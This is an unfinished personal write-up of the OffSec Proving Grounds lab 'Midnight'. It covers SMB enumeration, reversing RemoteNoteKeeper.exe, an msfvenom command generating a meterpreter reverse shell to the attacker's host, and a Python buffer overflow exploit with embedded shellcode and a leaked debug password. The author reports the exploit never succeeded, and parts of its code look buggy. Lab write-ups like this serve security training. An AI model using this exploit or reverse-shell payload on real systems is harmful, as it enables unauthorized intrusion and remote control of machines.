---
title: Midnight
date: 2026-01-27T12:00:04+01:00
draft: false
tags:
  - offsec
  - nmap
  - windows
  - proving-grounds
  - ghidra
categories:
  - Pentesting
  - Offsec
  - Windows
description: "This guide provides readers with the solution to the Proving Grounds Lab: Midnight"
---
Unfinished

nmap -p- --min-rate 5000 192.168.189.39

![](Screenshot%202026-01-04%20at%2008.35.22.png)

Port 135 - RPC - Remote Procedure Call
Port 139 - SMB - Server Message Block
Port 445 - SMB - Server Message Block

SMB enumeration:

`smbmap -H $VIC`

![](Screenshot%202026-01-04%20at%2009.05.56.png)


`netexec smb $vic
`smbclient -N -L //$vic/


![](Screenshot%202026-01-05%20at%2007.54.10.png)

Some great results with: `enum4linux-ng -A $vic`
![](Screenshot%202026-01-05%20at%2008.08.46.png)

![](Screenshot%202026-01-05%20at%2008.09.20.png)

`enum4linux-ng -A $vic -u syeiolif -p password`

![](Screenshot%202026-01-05%20at%2008.12.07.png)

![](Screenshot%202026-01-05%20at%2008.13.30.png)

`smbclient //$vic/Share -N`

![](Screenshot%202026-01-05%20at%2008.21.00.png)

![](Screenshot%202026-01-05%20at%2008.35.04.png)

binwalk - file - exiftool

![](Screenshot%202026-01-05%20at%2008.35.59.png)


 ![](Screenshot%202026-01-04%20at%2011.39.33.png)

There is a buffer offerflow vulnerability in the NOTE function. 

There is also a DUBUG password you need to find. 

I used Ghidra to look at the RemoteNoteKeeper.exe file.
	`sudo apt update && apt install ghirda`

I tried to follow some of the functions but I wasn't sure what I was doing. Gemini help me eventually find a function with an obfuscated password

![](Screenshot%202026-01-06%20at%2010.40.03.png)

Create the payload:
	`msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.160 LPORT=4444 -b "\x00" EXITFUNC=thread -f py`


Here is a python script that will help you get the address and insert a msfvenom payload. 

`
import socket, sys, time
from struct import pack

ip = '192.168.189.39'
port = 1337

def exploit(s, base_addr):

    jmp_esp_offset = 0x1f36 # offset for the pop ; pop ; pop ; jmp esp

    length = 4080

    buf =  b""
    buf += b"\xb8\xed\x83\xda\xec\xda\xd0\xd9\x74\x24\xf4\x5f"
    buf += b"\x33\xc9\xb1\x5e\x83\xef\xfc\x31\x47\x11\x03\x47"
    buf += b"\x11\xe2\x18\x7f\x32\x63\xe2\x80\xc3\x1c\x6b\x65"
    buf += b"\xf2\x0e\x0f\xed\xa7\x9e\x44\xa3\x4b\x54\x08\x50"
    buf += b"\xdf\x18\x84\x57\x68\x96\xf2\x56\x69\x16\x3a\x34"
    buf += b"\xa9\x38\xc6\x47\xfe\x9a\xf7\x87\xf3\xdb\x30\x5e"
    buf += b"\x79\x33\xec\xea\xd3\xdb\x47\x66\x91\xe7\x66\xa8"
    buf += b"\x9d\x58\x10\xcd\x62\x2c\xac\xcc\xb2\x46\x64\xd7"
    buf += b"\xb9\x01\x54\xe6\x6e\xe1\x11\x21\xe4\x3e\x50\x39"
    buf += b"\x31\xb4\x63\xeb\x0b\x35\x52\xd3\xad\x06\x99\x7f"
    buf += b"\x2c\x5e\x99\x9f\x5a\x94\xda\x22\x5d\x6f\xa1\xf8"
    buf += b"\xe8\x70\x01\x8a\x4b\x55\xb0\x5f\x0d\x1e\xbe\x14"
    buf += b"\x59\x78\xa2\xab\x8e\xf2\xde\x20\x31\xd5\x57\x72"
    buf += b"\x16\xf1\x3c\x20\x37\xa0\x98\x87\x48\xb2\x44\x77"
    buf += b"\xed\xb8\x66\x6e\x91\x40\x79\x8f\xcf\xd6\xb6\x42"
    buf += b"\xf0\x26\xd0\xd5\x83\x14\x7f\x4e\x0c\x15\x08\x48"
    buf += b"\xcb\x2c\x1e\x6b\x03\x96\x4e\x95\xa4\xe7\x47\x52"
    buf += b"\xf0\xb7\xff\x73\x79\x5c\xff\x7c\xac\xc9\xf5\xea"
    buf += b"\x8f\xa6\x24\x4b\x67\xb5\x36\x9a\x24\x30\xd0\xcc"
    buf += b"\x84\x12\x4c\xad\x74\xd3\x3c\x45\x9f\xdc\x63\x75"
    buf += b"\xa0\x36\x0c\x1c\x4f\xef\x65\x89\xf6\xaa\xfd\x28"
    buf += b"\xf6\x60\x78\x6a\x7c\x81\x7d\x25\x75\xe0\x6d\x52"
    buf += b"\xe2\x0a\x6d\xa3\x87\x0a\x07\xa7\x01\x5c\xbf\xa5"
    buf += b"\x74\xaa\x60\x55\x53\xa8\x66\xa9\x22\x99\x1d\x9c"
    buf += b"\xb0\xa5\x49\xe1\x54\x26\x89\xb7\x3e\x26\xe1\x6f"
    buf += b"\x1b\x75\x14\x70\xb6\xe9\x85\xe5\x39\x58\x7a\xad"
    buf += b"\x51\x66\xa5\x99\xfd\x99\x80\x99\xfa\x66\x57\xb6"
    buf += b"\xa2\x0e\xa7\x86\x52\xcf\xcd\x06\x03\xa7\x1a\x28"
    buf += b"\xac\x07\xe3\xe3\xe5\x0f\x6e\x62\x47\xb1\x6f\xaf"
    buf += b"\x09\x6f\x70\x5c\x92\x80\x0b\x2d\x25\x61\xec\x27"
    buf += b"\x42\x61\xed\x47\x74\x5d\x38\x7e\x02\xa0\xf9\xc5"
    buf += b"\x0d\x3f\xd7\x33\xa6\xe6\xb2\xf9\xab\x18\x69\x3d"
    buf += b"\xd2\x9a\x9b\xbe\x21\x82\xee\xbb\x6e\x04\x03\xb6"
    buf += b"\xff\xe1\x23\x65\xff\x23"

    prefix = b"NOTE "
    buffer1 = b'x90' * 200
    buffer2 = b'x90' * (length - len(buffer1) - len(buf))
    ret = pack("<L", base_addr + jmp_esp_offset)

    payload = prefix + buffer1 + buf + buffer2 + ret

    try:
        print(s.recv(1024))
        s.send(payload)
        s.recv(1024)
    except Exception as e:
        print(e)
        sys.exit(0)

def leak(s) -> int:
        print(s.recv(1024))
        s.send(b"DEBUG exp301isfun")
        time.sleep(1)
        print(s.recv(1024))
        time.sleep(1)
        s.send(b'READ DEBUG')
        leak = s.recv(1024)
        if b"Offsec" not in leak:
                leak = s.recv(1024)
        leak = str(leak)

        base_addr = leak.split('RemoteNoteKeeper.exe (Base Address: ')[1].split(')')[0]
        print(f"Base address: {base_addr}")

        base_addr = int(base_addr, 16)
        return base_addr


def main():
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((ip, port))
                base_addr = leak(s)
                exploit(s, base_addr)

                time.sleep(60)

if __name__ == '__main__':
        main()
`

Unfortunately after hours of trying I had give up. 